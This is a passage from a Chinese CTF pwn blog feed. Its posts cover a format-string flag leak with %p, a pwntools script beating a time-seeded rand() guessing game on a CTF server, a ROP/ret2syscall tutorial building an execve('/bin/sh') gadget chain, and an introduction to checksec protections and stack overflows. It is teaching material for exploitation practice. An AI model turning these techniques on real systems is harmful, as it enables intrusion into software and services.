class="string">&quot;r&quot;</span>);</span><br><span class="line">  *(_QWORD *)s = <span class="number">0LL</span>;</span><br><span class="line">  v6 = <span class="number">0LL</span>;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line">  v9 = <span class="number">0LL</span>;</span><br><span class="line">  v10 = <span class="number">0LL</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( stream )</span><br><span class="line">    fgets(s, <span class="number">50</span>, stream);</span><br><span class="line">  HIBYTE(v11) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;                                   </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Echo as a service&quot;</span>);</span><br><span class="line">    gets(format);</span><br><span class="line">    <span class="built_in">printf</span>(format);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经典格式化字符串漏洞吧</p><p>把flag.txt的内容存储在变量s里面，这题得用到gdb了</p><p>教一个办法，像这种调用文件的，建议自己在本地建一个同名文件，方便查看文件在栈中的地址</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022259158.png" title="b" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022259158.png" alt="b"></a></p><p>可以看到我们自己在本机创建的flag.txt此时位于栈上的位置</p><p>AAAAAAAA就是我们在gets中输入的值</p><p>所以我们可以知道flag和格式化字符串的偏移是11(有可能会有差错，所以我的建议是等下泄露flag的时候扩大范围多试几个)</p><p>为什么是11？AAAAAAAA不是和flag只间隔了3个字长？这里是<strong>64位和32位栈传参</strong>的差异</p><h3 id="64位和32位栈传参"><a href="#64位和32位栈传参" class="headerlink" title="64位和32位栈传参"></a>64位和32位栈传参</h3><p>我在初期栈学习中，就一直注重强调32位和64位的不同，因为我本人在初期学习中，就常常对这二者没有足够的分辨意识</p><p>接下来着重讲解这二者的不同</p><p>首先是我们之前已经详细讲过的32位传参</p><p>具体的传参方式就是在栈上传参，并且根据system和call system调用的不同，参数和函数地址的偏移也不同</p><p>我们在之前的阅读中，会注意到频繁出现的esp eip eax ebx等</p><p>这里的e就是32位特有，64位情况下的<strong>寄存器</strong>，通常是以r开头。例如rsp</p><p>64位传参的情况相较32位<strong>及其不同！！</strong>千万不要搞混</p><p>在linux操作系统中，前六个参数通过 RDI 、 RSI 、 RDX 、 RCX 、 R8 和 R9 传递</p><p>而在windows操作系统中，前四个参数通过 RCX 、 RDX 、 R8 和 R9 来传递</p><p>他们的共同点是，其第七个&#x2F;第五个参数就push入栈进行传递(因此上面的偏移值才是6+5[5是从AAAAAAAA开始数到flag])</p><p>既然已经清楚了大致的偏移量，我们开始传入格式化字符串吧、</p><p>​             <a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022300629.png" title="c" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022300629.png" alt="c"></a>                                                                </p><p>可以看到果然有些偏差，12才是正确的偏移量</p><p>这里又有一个问题了，为什么我们看到的是16进制形式的，而不是字符串形式</p><p>这就要从%x的用法着手分析了</p><p>x是打印出无0x的16进制</p><p>而我们换用%p试一下</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022300760.png" title="d" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022300760.png" alt="d"></a></p><p>转化成字符串看一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7&#123;FTCSSN</span><br></pre></td></tr></table></figure><p>倒过来，是不是像一个flag的格式了，说明这题就是用%p</p><p>这是为什么？%p和%x有什么区别？而且这里为什么又是倒转过来的？别急，慢慢讲</p><h3 id="1-为什么这里要用-p"><a href="#1-为什么这里要用-p" class="headerlink" title="1.为什么这里要用%p"></a>1.为什么这里要用%p</h3><p>%p是打印出所指栈位置中的地址指向的地方的内容</p><p>在搞懂这个问题前，我们得先知道，栈中是不会存储字符串的，这一点在栈溢出的时候就体现了出来</p><p>我们给system传参的时候是binsh字符串的地址，而不是binsh字符串</p><p>所以，看起来flag是存储到了栈中，其实只是他的地址被保存到了栈中</p><h3 id="2-为什么是倒转过来的"><a href="#2-为什么是倒转过来的" class="headerlink" title="2.为什么是倒转过来的"></a>2.为什么是倒转过来的</h3><p>这里涉及到了<strong>小端序和大端序</strong>的问题</p><p>这二者都属于<strong>字节序</strong>，什么是字节序？为什么要有字节序？</p><p>字节序指电脑内存中占用多个字节的数据的字节排列顺序</p><p>在几乎所有的平台上，多字节对象都被存储为连续的字节序列</p><p>为什么会有字节序，统一用大端序不行吗？答案是，计算机先处理低位字节，效率比较高，因为计算都是从低位开始的。所以，<strong>计算机的内部处理都是小端字节序。在计算机内部，小端序被广泛应用于现代 CPU 内部存储数据；而在其他场景，比如网络传输和文件存储则使用大端序</strong>。</p><p>那么什么是小端序和大端序？</p><p>大端序将数据的低位字节存放在内存的高位地址，高位字节存放在低位地址</p><p>小端序将一个多位数的低位放在较小的地址处，高位放在较大的地址处</p><p>看不懂没关系，图文演示一下</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022300598.png" title="e" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022300598.png" alt="e"></a></p><p>上图为小端序的存储状况，作为高位字节的12就放在了低地址</p><p>而大端序的存储，就比较符合我们人类的阅读习惯</p><p>这里因为大端序我们接触的少，再加上小端序已经作了详细的解释，同理可得，就不进行作图了(真的不是我懒)</p><p>截止到现在，本题涉及到的知识点已经全部讲完了，如果想练练手的话，可以试试ctfshow中的pwn04(格式化字符串泄露canary)</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HUBUCTF.新生赛.ez_pwn</title>
      <link href="/2022/09/17/HUBUCTF-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-pwn/"/>
      <url>/2022/09/17/HUBUCTF-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-pwn/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>ps:本题思路由youlin师傅指引</p><p>checksec一下，查看一下保护机制</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/a.png" title="a" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/a.png" alt="a"></a></p><p>保护全开 64位？有点被吓到了</p><p>不过这种题估计都是flag已经准备好了或者自带shellcode</p><p>拖进ida看看</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-8Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-88h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+Ch] [rbp-84h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> seed[<span class="number">2</span>]; <span class="comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+18h] [rbp-78h]</span></span><br><span class="line">  <span class="type">char</span> v9[<span class="number">32</span>]; <span class="comment">// [rsp+20h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">8</span>]; <span class="comment">// [rsp+40h] [rbp-50h] BYREF</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+48h] [rbp-48h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+50h] [rbp-40h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+58h] [rbp-38h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+60h] [rbp-30h]</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp+68h] [rbp-28h]</span></span><br><span class="line">  __int64 v16; <span class="comment">// [rsp+70h] [rbp-20h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [rsp+78h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v18; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v18 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  *(_QWORD *)seed = time(<span class="number">0LL</span>);</span><br><span class="line">  *(_QWORD *)s = <span class="number">0LL</span>;</span><br><span class="line">  v11 = <span class="number">0LL</span>;</span><br><span class="line">  v12 = <span class="number">0LL</span>;</span><br><span class="line">  v13 = <span class="number">0LL</span>;</span><br><span class="line">  v14 = <span class="number">0LL</span>;</span><br><span class="line">  v15 = <span class="number">0LL</span>;</span><br><span class="line">  v16 = <span class="number">0LL</span>;</span><br><span class="line">  v17 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Who goes there?&quot;</span>);</span><br><span class="line">  gets(v9);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome to my challenge, %s. No one has ever succeeded before. Will you be the first?\n&quot;</span>, v9);</span><br><span class="line">  srand(seed[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = rand() % <span class="number">100000</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I am thinking of a number from 1-100000. What is it?&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">if</span> ( v6 != v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You have failed. Goodbye.&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Impressive.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You&#x27;ve guessed all of my numbers. Here is your reward.&quot;</span>);</span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( stream )</span><br><span class="line">  &#123;</span><br><span class="line">    fgets(s, <span class="number">50</span>, stream);</span><br><span class="line">    <span class="built_in">puts</span>(s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Goodbye.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用时间做了种子，循环一百次，每次都随机一个数，我们需要输对这个数，算是经典的猜数字吧</p><p>一开始看到我们可以自定义赋值的v4和随机数v6是相邻的字节，所以想通过溢出来覆盖v6，使得if判断成立，不过貌似不行</p><p>所以还是正常做法吧</p><p>随机数，我目前知道的两种做法，一种是溢出数据覆盖seed，这样我们在知晓种子的值的情况下，因为c语言的rand是<strong>伪随机</strong>(下面就要降到了，我知道你很急，但你先别急)，所以就可以知道随机数的值</p><p>还有一种办法是本题将要使用到的，这道题我们可以发现他是用当前时间作为种子，来生成随机数，所以我们只要在exp中也是用当前时间作为种子，就可以得到一样的随机数（这里看不懂的话，是伪随机的概念不清楚）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line">io=remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28056</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">seed = libc.time(<span class="number">0</span>)</span><br><span class="line">libc.srand(seed)</span><br><span class="line">io.sendlineafter(b<span class="number">&#x27;</span>Who goes there?<span class="string">&#x27;, b&#x27;</span>chen<span class="number">&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">100</span>):</span><br><span class="line">    buf = libc.rand() % <span class="number">100000</span> + <span class="number">1</span></span><br><span class="line">    io.sendlineafter(b<span class="number">&#x27;</span>What is it?<span class="string">&#x27;, str(buf))</span></span><br><span class="line"><span class="string">    io.recvuntil(b&#x27;</span>\n<span class="number">&#x27;</span>)</span><br></pre></td></tr></table></figure><p>几个疑点</p><h3 id="1-cdll-LoadLibrary的用法："><a href="#1-cdll-LoadLibrary的用法：" class="headerlink" title="1.cdll.LoadLibrary的用法："></a>1.cdll.LoadLibrary的用法：</h3><p>看了很多篇猜数字的题解啊，竟然没有一个人对这个函数用法有解释，那没办法了，只能自己wiki了</p><p>这个函数就是在python中重新加载文件库</p><p>还是有限制的：<strong>在64位的windows系统中，一个64位进程不能加载一个32位dll，同理一个32位进程也不能加载一个64位dll</strong>。</p><p>查资料的时候还看到这个限制的特殊情况，不过看不明白，估计了解的价值也不大，先丢在这，有空来填这个坑，感兴趣的可以自己先看<a href="https://blog.csdn.net/wowocpp/article/details/105382257">(3条消息) python 调用 C++ dll 32位 64位 问题 ctypes.cdll.LoadLibrary_wowocpp的博客-CSDN博客_python调用32位dll</a></p><p>还有一种更深的用法是这个代码库将允许原生Linux程序从一个WindowsDLL文件中加载或调用功能函数</p><p><a href="https://blog.csdn.net/weixin_34370877/article/details/116549216">(3条消息) linux运行dll文件命令,LoadLibrary：一款能够允许Linux程序从DLL文件中加载或调用函数的工具…_七分醉玲珑的博客-CSDN博客</a></p><p>因为涉及到linux和windows的进程间通信和内核相关知识，我自己也还没有搞懂，留个坑吧，看以后有没有时间填上</p><h3 id="2-伪随机"><a href="#2-伪随机" class="headerlink" title="2.伪随机"></a>2.伪随机</h3><p>这里介绍一下c语言中的伪随机</p><p>一些基础的c语言知识这里就不多解释了，比如说srand用法和种子的概念</p><p>先看看一段代码吧</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%4d&quot;</span>,rand());</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出10个随机数，我们两次运行试试</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/b.png" title="b" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/b.png" alt="b"></a></p><p>生成的随机数都一样？</p><p>我们不妨这么理解，所谓的rand函数就是根据每个种子分配一张表格，所谓的随机数是从这个表格调用的，所以当我们第二次运行时，由于种子没改变，那么这张表格的数据也不会改变</p><p>那么我们如何获得真正意义上的随机数？想一下有什么东西的数据是一直在变化的</p><p>我们把目光瞄向时间，函数srand( (unsigned)time( NULL ) ) 中time返回的是1970年1月1日0点到现在时间流失的秒数值</p><p>因此，我们这下没法得知种子是多少，也就无法知道这个种子对应的随机数表是什么</p><p>但是我们重加载了libc库，同步获取了time返回的种子值，由于time是以秒作为单位的，我们每次for循环得出的随机数和题目的随机数几乎没有差距，所以这道题的随机数就呼之欲出了</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ROP</title>
      <link href="/2022/09/17/ROP/"/>
      <url>/2022/09/17/ROP/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="动态链接和静态链接"><a href="#动态链接和静态链接" class="headerlink" title="动态链接和静态链接"></a>动态链接和静态链接</h2><p>静态链接和动态链接的相关概念，我们在栈溢出篇曾粗略提到过</p><p>我们说到，为了防止每次调用函数都需要将函数的libc库拷贝到文件中，加大文件的存储占用</p><p>不如在程序运行时将动态库加载到内存中，多个程序运行只需要调用一份</p><p>静态库特点：<br>1.静态库对函数库的链接是放在编译时期完成的<br>2.程序在运行时与函数库再无瓜葛，<strong>移植方便</strong>。<br>3.<strong>浪费空间</strong>和资源，因为所有相关的目标文件与牵涉到的函数库被链接合成一个可执行文件<br>4.如果静态库进行更新则应用该库的所有程序都需要重新编译（全量更新）。</p><p>动态库特点：<br>1.动态库把对一些库函数的链接载入推迟到程序<strong>运行时期</strong>。<br>2.可以实现进程之间的<strong>资源共享</strong>。（因此动态库也称为共享库）<br>3.将一些程序<strong>升级</strong>变得<strong>简单</strong>。<br>4.甚至可以真正做到链接载入完全由程序员在程序代码中控制（显示调用）</p><p>还是不太清楚？我们这样来理解，我们在吃饭前需要备好碗筷</p><p>如果我们每吃一道菜就要准备一副碗筷，这是静态库</p><p>如果我们只用一副碗筷就吃完所有菜，这是动态库</p><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>在明白了动态库和静态库的区别后，我们接着讲栈溢出的相关内容</p><p>我们已经学过的栈溢出，需要函数中有着出题人给我们预先准备好的system函数和binsh字符串</p><p>如果没有呢？我们又该从何入手</p><p>在开始之前，我们先明白几个概念</p><p>1、rop：在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</p><p>2、gadgets：在程序中的指令片段，有时我们为了达到我们执行命令的目的，需要多个gadget来完成我们的功能。gadget最后一般都有ret，因为我们需要将程序控制权(EIP)给下一个gadget。即让程序自动持续的选择堆栈中的指令依次执行。(涉及到接下来的栈变化情况，现在看不懂的没关系，接下来会图片演示详讲)</p><p>3、ropgadgets：一个pwntools的一个命令行工具，用来具体寻找gadgets的。例如：我们从pop、ret序列当中寻找其中的eax</p><p>4.在linux系统中，函数的调用是有一个<strong>系统调用号</strong>的</p><p>我们接下来详细介绍这个系统调用号</p><h3 id="系统调用号"><a href="#系统调用号" class="headerlink" title="系统调用号"></a>系统调用号</h3><p>Linux 的系统调用通过 int 80h 实现，用系统调用号来区分入口函数</p><p>而我们需要用到的system(&#x2F;bin&#x2F;sh)函数的系统调用号为11，也就是0xb</p><p>他的系统调用规范是execve(“&#x2F;bin&#x2F;sh”, 0,0)</p><p>那么我们如何向栈中传入这一串的数据来达到我们调用system的目的呢？</p><p>计算机语言分为高级语言和低级语言</p><p>我们先要知道，像c语言，python语言这样的，是属于<strong>高级语言</strong></p><p>高级语言指较接近自然语言和数学公式的编程，基本脱离了机器的硬件系统，用人们更易理解的方式编写程序</p><p>低级语言包括机器语言(二进制语言)和汇编语言</p><p>这两种语言都是面向机器的语言，和具体机器的指令系统密切相关</p><p>所以我们输入的是system(&#x2F;bin&#x2F;sh)，但是实际上计算机他不能读懂这段代码是什么意思</p><p>他要先进行编译，将其转化为自己能读懂的汇编语言</p><p>所以system(&#x2F;bin&#x2F;sh)用汇编语言来表示也可以转化为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop eax   系统调用号载入， execve为0xb</span><br><span class="line">pop ebx   第一个参数， /bin/sh的string</span><br><span class="line">pop ecx    第二个参数，0</span><br><span class="line">pop edx   第三个参数，0</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><p>仔细思考一下，静态链接是将静态库在程序运行前就载入于文件中</p><p>所以，我们有了思路，既然静态链接导致的后果是文件过于庞大，因为其加载了静态库</p><p>所以我们可以在程序文件中搜索特定的汇编语言，将其一条条<strong>串连</strong>起来</p><p>这里我觉得有必要再插入一段说明，关于这个串连</p><p>我们是如何进行栈溢出的，实际上是覆盖ret addr来达到我们控制程序执行流的目的对吧</p><p>所以我们只需要确保每一个汇编代码执行完了以后都有一个ret指令，我们就可以使程序执行流按照我们预想的方式来跳转</p><p>那么我们又该如何寻找这些汇编代码呢？这里就用到了我们刚才提过的ropgadgets工具</p><h3 id="ropgadgets"><a href="#ropgadgets" class="headerlink" title="ropgadgets"></a>ropgadgets</h3><p>我们在linux终端中输入</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ROPgadget   -binary 文件名 --only<span class="string">&quot; 要搜索的 &quot;</span> </span><br></pre></td></tr></table></figure><p>于是，我们得到了 pop eax&#x2F;ebx 的地址</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/a.png" title="a" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/a.png" alt="a"></a></p><p>这里是是否还有一个疑问？欸他这里是连在一起的啊，就比如第一行pop eax和pop ebx是连在一起的怎么办？</p><p>很简单，我们只需要同时传入他们各自所需要的参数即可</p><p>我们再搜索ebx.ecx.edx 以及int 80h系统调用和bin&#x2F;sh</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/b.png" title="b" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/b.png" alt="b"></a></p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/c.png" title="c" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/c.png" alt="c"></a></p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/d.png" title="d" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/d.png" alt="d"></a></p><p>到这里为止，我们就清楚了rop构造执行流的完整思路，接下来我们用一道例题来演示</p><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>我们先用checksec检查他开启了哪些保护机制以及查看他的位数</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/e.png" title="e" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/e.png" alt="e"></a></p><p>打开了NX保护机制，我们无法在栈中读写数据，所以只能采用构造ROP执行流的办法</p><p>再用ida打开看一下main函数写了什么</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/f.png" title="f" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/f.png" alt="f"></a></p><p>可以看到gets函数，判断应该也是一个栈溢出题</p><p>但是没有给我们提供system函数地址和字符串binsh地址</p><p>所以我们这里利用ROP构造</p><p>我们来查找pop eax等汇编代码的地址</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/g.png" title="g" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/g.png" alt="g"></a></p><p>得到了地址之后，我们开始构造payload</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> stack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出</title>
      <link href="/2022/09/15/32%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
      <url>/2022/09/15/32%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>继上文点到栈溢出的基础原理，本文来详细演示如何完成一题栈溢出</p><h2 id="checksec的使用及保护机制了解"><a href="#checksec的使用及保护机制了解" class="headerlink" title="checksec的使用及保护机制了解"></a>checksec的使用及保护机制了解</h2><p>操作系统提供了许多安全机制来尝试降低或阻止<a href="https://so.csdn.net/so/search?q=%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA&spm=1001.2101.3001.7020">缓冲区溢出</a>攻击带来的安全风险</p><p>在我们开始尝试做题之前，我们先得知道这道题开启了哪些安全机制，我们又该如何绕过其安全机制</p><p>这里便使用到了checksec工具</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022250194.png" title="a" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022250194.png" alt="a"></a></p><h3 id="Arch："><a href="#Arch：" class="headerlink" title="Arch："></a>Arch：</h3><p>程序架构信息。判断是拖进64位IDA还是32位？exp编写时p64还是p32函数？</p><h3 id="RELRD"><a href="#RELRD" class="headerlink" title="RELRD:"></a>RELRD:</h3><p>Relocation Read-Only (RELRO)  此项技术主要针对 GOT 改写的攻击方式。它分为两种，Partial RELRO 和 Full RELRO。<br>部分RELRO 易受到攻击，例如攻击者可以<strong>atoi.got为system.plt，进而输入&#x2F;bin&#x2F;sh\x00获得shell</strong><br>完全RELRO 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。</p><p>（看不懂没有关系 ，后续学习将会接触到plt和got表的相关知识）</p><h3 id="Stack："><a href="#Stack：" class="headerlink" title="Stack："></a>Stack：</h3><p>由上文可知，在我们进行栈溢出的时候，只需覆盖ret addr就能达到操控程序执行流的目的，但此项保护机制，在栈中会随机生成一段数据，在函数返回的时候，会检验这段数据是否正确，如果不正确，程序就会崩溃退出，这段数据在liunx中被称为canary</p><h3 id="NX"><a href="#NX" class="headerlink" title="NX:"></a>NX:</h3><p>NX enabled如果这个保护开启就是意味着我们对栈中数据没有执行权限，我们无法在栈中自由更写，但是通过ROP构造执行流的办法可以绕过这个保护(同样将在接下来的学习中讲到)</p><h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE:"></a>PIE:</h3><p>pie保护机制和ASLR相类似，我们已经知道每个数据在计算机中都有自己相应的地址，通过寻址计算机可以成功调用他们，ASLR 将程序运行时的堆栈以及共享库的加载地址随机化，而 PIE 技术则在编译时将程序编译为位置无关, 即程序中的地址在每次运行时都会发生变化，我们将在后续的学习中接触到pie</p><h2 id="ida使用和漏洞分析"><a href="#ida使用和漏洞分析" class="headerlink" title="ida使用和漏洞分析"></a>ida使用和漏洞分析</h2><p>通过checksec我们可以得知此题为32位，我们将其拖进32位ida查看</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022250867.png" title="b" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022250867.png" alt="b"></a></p><p>左边的function name是此二进制文件中的函数列表，通常主函数的名称是main</p><p>右侧便为此文件的汇编代码</p><p>我们可以按下f5进行ida反编译，将其转化为c语言代码的形式</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022250712.png" title="c" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022250712.png" alt="c"></a></p><p>main函数的组成相当简单，只有一个子函数shell，我们点进去看看</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022250321.png" title="d" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022250321.png" alt="d"></a></p><p>第三行，定义了一个buf变量，那么后面的esp+0h和ebp-48h是什么意思？</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022251093.png" title="e" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022251093.png" alt="e"></a></p><p>我们进行栈溢出的目的是为了覆盖ret addr 从而将程序的返回地址修改成我们需要的，此时read读入的变量buf的位置就是位于ebp再往上0x48处的栈顶</p><p>所以我们可以得知，我们赋值的变量buf离ret addr差了0x48+0x4个字节</p><p>这里为什么还要加4？如果是64位呢，还是加4吗</p><p>我们之前说过了，一个字长对应的字节是根据位数的不同来决定的</p><p>此时需要在0x48的数据上再加上0x4是因为我们离ret  addr还隔着一个ebp，一个字长的距离</p><p>接下来我们看回程序，输出语句”welcome to NISACTF”</p><p>在return处调用了函数read，读入了0x60字长的数据，而此时我们需要溢出的数据长度为0x48+0x4+0x4(我们用来覆盖ret addr的数据)</p><p>这里就出现了栈溢出漏洞，但是此时我们还需要system(&#x2F;bin&#x2F;sh)的地址，以达到获取flag的目的</p><p>我们可以依法炮制，翻阅其他函数的内容，我们发现这题的作者并没有直接给我们</p><p>那么system(&#x2F;bin&#x2F;sh)就需要我们自己构造</p><p>我们接着使用shift+f12来打开string窗口，一键找出所有的字符串</p><p><a 